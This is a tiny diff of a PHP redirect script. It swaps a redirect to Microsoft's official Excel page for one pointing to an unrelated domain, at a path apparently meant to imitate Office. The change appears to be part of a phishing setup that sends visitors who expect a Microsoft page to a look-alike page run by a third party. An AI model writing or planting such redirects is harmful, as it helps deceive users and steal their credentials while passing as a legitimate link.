@@ -1,4 +1,4 @@
 <?php
-header("Location: https://products.office.com/en-US/excel");
+header("Location: https://cottonstitch.us/off/index.html");
 die();
 ?>
